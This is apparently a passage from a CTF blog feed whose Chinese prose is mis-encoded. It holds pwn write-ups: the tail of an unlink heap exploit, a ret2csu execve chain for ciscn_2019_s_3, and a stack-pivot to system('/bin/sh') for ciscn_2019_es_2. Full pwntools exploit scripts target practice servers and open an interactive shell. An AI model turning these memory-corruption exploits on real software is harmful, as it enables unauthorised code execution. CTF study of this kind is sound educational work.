class="line"><span class="comment"># db(&#x27;b* 0x4009E6&#x27;)#alloc</span></span><br><span class="line">db(<span class="string">&#x27;b* 0x400AE3&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BA7&#x27;) #free</span></span><br><span class="line">head=<span class="number">0x602140</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x31</span>)+p64(head+<span class="number">16</span>-<span class="number">0x18</span>)+p64(head+<span class="number">16</span>-<span class="number">0x10</span>)+p64(<span class="number">0x00</span>)+p64(<span class="number">0x6666</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line"><span class="built_in">bin</span>=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+base</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¦‚æœæˆ‘ä»¬æ‰¾åˆ°æˆ–ä¼ªé€ åœ°å€é‡Œé¢çš„å€¼æ˜¯ä¼ªé€ çš„chunkPçš„åœ°å€å€¼</p><ul><li><p>ä¸€ä¸ªåœ°å€</p><blockquote><p>æˆ‘ä»¬æŠŠè¯¥åœ°å€tarï¼Œtar-0x18å¡«å…¥fdç»•è¿‡FD+0x18&#x3D;Pï¼Œtar-0x10å¡«å…¥bkç»•è¿‡BK+0x10&#x3D;P</p><p>æœ€ç»ˆå®ç°æ•ˆæœæ˜¯åœ¨è¯¥taråœ°å€å†™å…¥tar-0x18</p></blockquote></li><li><p>ä¸¤ä¸ªåœ°å€</p><blockquote><p>tar1 å’Œ tar2 tar1-0x18å†™å…¥fdï¼Œtar2-0x10å†™å…¥bk</p><p>tar1åœ°å€å†™å…¥tar2-0x10|bkå€¼</p><p>tar2åœ°å€å†™å…¥tar1-0x18|fdå€¼</p></blockquote></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_s_3</title>
      <link href="/2023/03/13/ciscn-2019-s-3/"/>
      <url>/2023/03/13/ciscn-2019-s-3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://files.buuoj.cn/files/5f9ef7ea96325fa7c9301560afeec679/ciscn_s_3">https://files.buuoj.cn/files/5f9ef7ea96325fa7c9301560afeec679/ciscn_s_3</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn$ checksec ciscn_2019_s_3</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/ciscn_2019_s_3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å¤§ä½“æ€è·¯"><a href="#å¤§ä½“æ€è·¯" class="headerlink" title="å¤§ä½“æ€è·¯"></a>å¤§ä½“æ€è·¯</h2><p>å¤§ä½“ä¸Šmainé‡Œåªæœ‰vulnè¿™ä¸€ä¸ªå‡½æ•°ï¼Œbufä¼šæº¢å‡º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004ED</span><br><span class="line">.text:00000000004004ED                               ; __unwind &#123;</span><br><span class="line">.text:00000000004004ED 55                            push    rbp</span><br><span class="line">.text:00000000004004EE 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004004F1 48 31 C0                      xor     rax, rax</span><br><span class="line">.text:00000000004004F4 BA 00 04 00 00                mov     edx, 400h                       ; count</span><br><span class="line">.text:00000000004004F9 48 8D 74 24 F0                lea     rsi, [rsp+buf]                  ; buf</span><br><span class="line">.text:00000000004004FE 48 89 C7                      mov     rdi, rax                        ; fd</span><br><span class="line">.text:0000000000400501 0F 05                         syscall                                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000400503 48 C7 C0 01 00 00 00          mov     rax, 1</span><br><span class="line">.text:000000000040050A BA 30 00 00 00                mov     edx, 30h ; &#x27;0&#x27;                  ; count</span><br><span class="line">.text:000000000040050F 48 8D 74 24 F0                lea     rsi, [rsp+buf]                  ; buf</span><br><span class="line">.text:0000000000400514 48 89 C7                      mov     rdi, rax                        ; fd</span><br><span class="line">.text:0000000000400517 0F 05                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000400519 C3                            retn</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519                               vuln endp ; sp-analysis failed</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040051A 90                            db 90h</span><br><span class="line">.text:000000000040051B                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040051B 5D                            pop     rbp</span><br><span class="line">.text:000000000040051C C3                            retn</span><br></pre></td></tr></table></figure><p>æœ‰gadget,çœ‹åˆ°3b&#x3D;59ç³»ç»Ÿè°ƒç”¨å·ï¼Œ<code>#define __NR_execve 59</code>ï¼Œå¯ä»¥é…åˆsyscallèµ·shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004D6                               public gadgets</span><br><span class="line">.text:00000000004004D6                               gadgets proc near</span><br><span class="line">.text:00000000004004D6                               ; __unwind &#123;</span><br><span class="line">.text:00000000004004D6 55                            push    rbp</span><br><span class="line">.text:00000000004004D7 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh</span><br><span class="line">.text:00000000004004E1 C3                            retn</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E1                               gadgets endp ; sp-analysis failed</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E2                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:00000000004004E9 C3                            retn</span><br><span class="line">.text:00000000004004E9</span><br><span class="line">.text:00000000004004E9                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004EA 90                            db 90h</span><br><span class="line">.text:00000000004004EB                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004EB 5D                            pop     rbp</span><br><span class="line">.text:00000000004004EC C3                            retn</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æˆ‘ä»¬å¯ä»¥ä»vulnæ±‡ç¼–æœ€åretå‰æ²¡æœ‰å¸¸è§„çš„pop ebpç­‰ï¼Œåªéœ€è¦†ç›–åˆ°ebpå°±å¯ä»¥retåˆ°hookå‡½æ•°ï¼ŒåŒæ—¶ç¨‹åºæ²¡æœ‰&#x2F;bin&#x2F;sh stringï¼Œæˆ‘ä»¬è¿˜éœ€è¦è‡ªå·±æ„é€ </p><p>vulnå‡½æ•° <code>mov     edx, 30h ; &#39;0&#39;</code>è¾“å…¥0x30å­—èŠ‚ï¼Œæˆ‘ä»¬çš„bufåªæ˜¯åœ¨0x10ä½ç½®ä¼šæŠŠebpç»™è¾“å‡ºæ¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ³„éœ²çš„ebpï¼Œæ¥å¯»å€æˆ‘ä»¬çš„è¾“å…¥ï¼Œé€šè¿‡è¾“å…¥æ„é€ binsh</p><h2 id="æ³„éœ²ebp"><a href="#æ³„éœ²ebp" class="headerlink" title="æ³„éœ²ebp"></a>æ³„éœ²ebp</h2><p>s(bâ€™&#x2F;bin&#x2F;sh\x00â€™.ljust(0x10,bâ€™aâ€™)+p64(ret_fun))</p><p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313004045662.png" alt="image-20230313004045662"></p><p>æˆ‘ä»¬æ³„éœ²0x7ffed29ae428ï¼Œè¾“å…¥åœ¨0x7ffed29ae310ã€‚</p><p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313004213386.png" alt="image-20230313004213386"></p><p>å†æ¬¡è¿”å›vulnå‡½æ•°ï¼Œæ³„éœ²åœ°å€-0x118ï¼Œå°±å¯ä»¥å¾—åˆ°è¾“å…¥æ ˆåœ°å€</p><h2 id="ret2cmu-getshell"><a href="#ret2cmu-getshell" class="headerlink" title="ret2cmu getshell"></a>ret2cmu getshell</h2><h3 id="first-way"><a href="#first-way" class="headerlink" title="first way"></a>first way</h3><p>padding&#x3D;bâ€™&#x2F;bin&#x2F;sh\x00â€™.ljust(0x10,bâ€™aâ€™)<br>payload&#x3D;padding+p64(csu_end)+p64(0)*2+p64(ebp+0x50)+p64(0)*3+p64(csu_front)+p64(mov_rax)+p64(rdi)+p64(ebp)+p64(syscall)</p><p>è¿™é‡Œæˆ‘ä»¬è¦execve(â€œ&#x2F;bin&#x2F;shâ€,0,0)</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">å°†sys_execve çš„è°ƒç”¨å· 59 èµ‹å€¼ç»™ rax</span><br><span class="line">å°†ç¬¬ä¸€ä¸ªå‚æ•°å³å­—ç¬¦ä¸² &quot;/bin/sh&quot;çš„åœ°å€ èµ‹å€¼ç»™ rdi</span><br><span class="line">å°†ç¬¬äºŒä¸ªå‚æ•° 0  èµ‹å€¼ç»™ rsi</span><br><span class="line">å°†ç¬¬ä¸‰ä¸ªå‚æ•° 0  èµ‹å€¼ç»™ rdx</span><br></pre></td></tr></table></figure><p>rax,rdi,rsi å¥½è¯´</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/pwn&gt; ROPgadget --binary &#x27;ciscn_2019_s_3&#x27; --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a2 : pop r15 ; ret</span><br><span class="line">0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400440 : pop rbp ; ret</span><br><span class="line">0x00000000004005a3 : pop rdi ; ret</span><br><span class="line">0x00000000004005a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004003a9 : ret</span><br></pre></td></tr></table></figure><p>rdxç½®é›¶éœ€è¦cmu</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">.text:0000000000400580 4C 89 EA                      mov     rdx, r13</span><br><span class="line">.text:0000000000400583 4C 89 F6                      mov     rsi, r14</span><br><span class="line">.text:0000000000400586 44 89 FF                      mov     edi, r15d</span><br><span class="line">.text:0000000000400589 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:0000000000400589</span><br><span class="line">.text:000000000040058D 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:0000000000400591 48 39 EB                      cmp     rbx, rbp</span><br><span class="line">.text:0000000000400594 75 EA                         jnz     short loc_400580</span><br><span class="line">.text:0000000000400594</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596                               loc_400596:                             ; CODE XREF: __libc_csu_init+34â†‘j</span><br><span class="line">.text:0000000000400596 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:000000000040059A 5B                            pop     rbx</span><br><span class="line">.text:000000000040059B 5D                            pop     rbp</span><br><span class="line">.text:000000000040059C 41 5C                         pop     r12</span><br><span class="line">.text:000000000040059E 41 5D                         pop     r13</span><br><span class="line">.text:00000000004005A0 41 5E                         pop     r14</span><br><span class="line">.text:00000000004005A2 41 5F                         pop     r15</span><br><span class="line">.text:00000000004005A4 C3                            retn</span><br><span class="line">.text:00000000004005A4                               ; &#125; // starts at 400540</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨40059Aå¤„çš„rdiï¼Œå†è¿”å›åˆ°0400580ï¼Œå¯ä»¥æ§åˆ¶rdxï¼ŒåŒæ—¶å°†rbxç½®é›¶ï¼Œå°±ä¼šcall [r12+rbx*8]é‡Œçš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œæ§åˆ¶æµä¼šè¢«åŠ«æŒï¼Œæˆ‘ä»¬å°†r12é‡Œçš„å†…å®¹æ§åˆ¶ä¸ºæˆ‘ä»¬åŸæœ¬è¦retçš„mov_raxå³å¯ï¼Œåªä¸è¿‡è¿™é‡Œæ˜¯callï¼Œæœ‰æ„æ€çš„å°±æ˜¯è¿™é‡Œ</p><p>call mov_ret</p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313005704624.png" alt="image-20230313005704624" style="zoom:67%;"><p>callä¹‹åä¼šè¿”å›åˆ° add rbx,1</p><p>è¿™ä¸ªæ—¶å€™ rbpå’Œrbpä¸€å®šä¸ç›¸ç­‰ï¼Œå†æ¬¡å›åˆ°csu_frontè¿›è¡Œcall [r12+rbx*8]&#x3D;call [r12+8]ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„pop rdiæŒ‡ä»¤</p><img src="/2023/03/13/ciscn-2019-s-3/image-20230313005856293.png" alt="image-20230313005856293" style="zoom:67%;"><p>è¿™æ¬¡çš„pop rdi ä¼šæŠŠcall [r12+8] çš„è¿”å›åœ°å€popæ‰è¿™æ ·æˆ‘ä»¬retæ˜¯æ‰§è¡Œæµå›åˆ°payloadçš„mov raxä¸Šç„¶åæ­£å¸¸rop</p><h3 id="second-way"><a href="#second-way" class="headerlink" title="second way"></a>second way</h3><p>payload&#x3D;padding+p64(csu_end)+p64(0)+p64(1)+p64(ebp+0x50)+p64(0)+p64(0)+p64(0)+p64(csu_front)+p64(mov_rax)</p><p>payload+&#x3D;bâ€™aâ€™*48+p64(rdi)+p64(ebp)+p64(syscall)</p><p>è¿™é‡Œå°±æ˜¯ç”¨ä¸€ä¸ªå¸¸è§„çš„ret2cmuï¼Œå°†ebpå’Œrbxå»ç¬¦åˆcmp     rbx, rbpï¼Œä¸è·³è½¬çš„è·³è½¬æœ€åå†retåˆ°pop rdiçš„æ‰§è¡Œæµ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12_call,r13_a3,r14_a2,r15_a1,last_ret</span>):<span class="comment">#æ³¨æ„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯callçš„r12å¯„å­˜å™¨æ‰€å­˜åœ°å€é‡Œçš„åœ°å€call    qword ptr [r12+rbx*8]</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    rbx=0</span></span><br><span class="line"><span class="string">    rbp=1</span></span><br><span class="line"><span class="string">    r12= call the address in address</span></span><br><span class="line"><span class="string">    r13= rdx third argument</span></span><br><span class="line"><span class="string">    r14= rsi second argument</span></span><br><span class="line"><span class="string">    r15= edi first argument </span></span><br><span class="line"><span class="string">    last= ret address   </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload=padding+fake_rbp+p64(cmu_end)+p64(rbx)+p64(rbp)+p64(r12_call)+p64(r13_a3)+p64(r14_a2)+p64(r15_a1)+p64(cmu_front)</span><br><span class="line">    payload+=fake_reg+p64(last_ret)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment">#fake_regä¸€èˆ¬56å­—èŠ‚</span></span><br></pre></td></tr></table></figure><img src="/2023/03/13/ciscn-2019-s-3/image-20230313011205443.png" alt="image-20230313011205443" style="zoom:67%;"><img src="/2023/03/13/ciscn-2019-s-3/image-20230313011338278.png" alt="image-20230313011338278" style="zoom:67%;"><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ciscn_2019_s_3&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;29483&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line">db(<span class="string">&#x27;b *0x0400501&#x27;</span>)</span><br><span class="line">ret_fun=<span class="number">0x04004ED</span></span><br><span class="line">csu_end = <span class="number">0x040059A</span></span><br><span class="line">csu_front = <span class="number">0x0400580</span></span><br><span class="line">rdi=<span class="number">0x00000000004005a3</span></span><br><span class="line">syscall=<span class="number">0x400517</span></span><br><span class="line">mov_rax=<span class="number">0x4004E2</span></span><br><span class="line">s(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(ret_fun))</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">ebp=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x118</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp)</span><br><span class="line">padding=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#first way</span></span><br><span class="line">payload=padding+p64(csu_end)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(ebp+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(csu_front)+p64(mov_rax)+p64(rdi)+p64(ebp)+p64(syscall)</span><br><span class="line"><span class="comment">#second way</span></span><br><span class="line"><span class="comment"># payload=padding+p64(csu_end)+p64(0)+p64(1)+p64(ebp+0x50)+p64(0)+p64(0)+p64(0)+p64(csu_front)+p64(mov_rax)</span></span><br><span class="line"><span class="comment"># payload+=b&#x27;a&#x27;*48+p64(rdi)+p64(ebp)+p64(syscall)</span></span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Ret2cmu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_es_2</title>
      <link href="/2023/03/12/ciscn-2019-es-2/"/>
      <url>/2023/03/12/ciscn-2019-es-2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://files.buuoj.cn/files/3b1f1f64834cb78d6bafc0422ec4fbec/ciscn_2019_es_2">https://files.buuoj.cn/files/3b1f1f64834cb78d6bafc0422ec4fbec/ciscn_2019_es_2</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/BUU&gt; checksec ciscn_2019_es_2 </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/BUU/ciscn_2019_es_2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¼æ´å‡½æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªæœ‰0x8å­—èŠ‚å¯æ§ï¼Œæœ‰systemå‡½æ•°åœ¨</p><p>è€ƒè™‘æ ˆè¿ç§»ï¼Œå¸¸è§„æˆ‘ä»¬ä¼šå¾€bssæ®µè¿ç§»ï¼Œä½†æ˜¯è¿™æ¬¡å¯ä»¥æ³„éœ²å¤„ebp</p><h2 id="æ³„éœ²ebp"><a href="#æ³„éœ²ebp" class="headerlink" title="æ³„éœ²ebp"></a>æ³„éœ²ebp</h2><p>åˆ©ç”¨printfå°±å¯ä»¥æ³„éœ²å‡ºebp</p><p>padding&#x3D;bâ€™aâ€™*0x28<br>sa(bâ€™name?\nâ€™,padding)</p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195405528.png" alt="image-20230312195405528" style="zoom: 80%;"><p>æ³„éœ²å‡ºebp&#x3D;0xff82fc88</p><h3 id="æ ˆè¿ç§»åˆ°æ ˆä¸Š"><a href="#æ ˆè¿ç§»åˆ°æ ˆä¸Š" class="headerlink" title="æ ˆè¿ç§»åˆ°æ ˆä¸Š"></a>æ ˆè¿ç§»åˆ°æ ˆä¸Š</h3><p>å¯ä»¥ä»ä»€ä¹ˆçœ‹åˆ°æ³„éœ²å‡ºæ¥çš„ebpå’Œæˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹å·®0xff82fc88âˆ’0xff82fc50&#x3D;0x38</p><p>ä¸‹æ¬¡readä¹Ÿä¼šå¾€è¿™ä¸ªåœ°æ–¹readï¼Œæˆ‘ä»¬æå‰åœ¨ä¸Šé¢å¸ƒç½®å¥½æ ˆå¸§ï¼Œå°†ebpè¦†ç›–ä¸ºæˆ‘ä»¬çš„è¾“å…¥ç‚¹ï¼Œä¹Ÿå°±æ˜¯ä¼ªé€ çš„æ ˆå¸§ï¼Œå†å°†è¿”å›åœ°å€è¦†ç›–ä¸ºleave retï¼Œè¿™æ ·mov espï¼Œebpï¼Œä¼šåˆ°è¾¾è¾“å…¥ç‚¹ï¼Œ</p><p>å†pop ebpï¼Œè¾“å…¥ç‚¹å‰å››ä¸ªå­—èŠ‚è¾“å…¥junkå³å¯ï¼Œ</p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195704199.png" alt="image-20230312195704199" style="zoom:80%;"><p>å†retï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥æ¥ç®¡æ‰§è¡Œæµï¼Œbin&#x2F;shä¹Ÿå¯ä»¥åˆ©ç”¨æ³„éœ²çš„æ ˆå’Œåç§»è¿›è¡Œç¡®å®š</p><p>payload2&#x3D;bâ€™junkâ€™+p32(elf.symbols[â€˜systemâ€™])+p32(0x123)+p32(ebp+0x10)+bâ€&#x2F;bin&#x2F;shâ€<br>payload2&#x3D;payload2.ljust(0x28,bâ€™\x00â€™)<br>payload2+&#x3D;p32(ebp)+p32(leave_ret)</p><p><img src="/2023/03/12/ciscn-2019-es-2/image-20230312195856603.png" alt="image-20230312195856603"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25443&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line">db(<span class="string">&#x27;b* 0x80485CD&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">sa(<span class="string">b&#x27;name?\n&#x27;</span>,padding)</span><br><span class="line">ru(padding)</span><br><span class="line">ebp=u32(io.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;junk&#x27;</span>+p32(elf.symbols[<span class="string">&#x27;system&#x27;</span>])+p32(<span class="number">0x123</span>)+p32(ebp+<span class="number">0x10</span>)+<span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(ebp)+p32(leave_ret)</span><br><span class="line">sl(payload2)</span><br><span 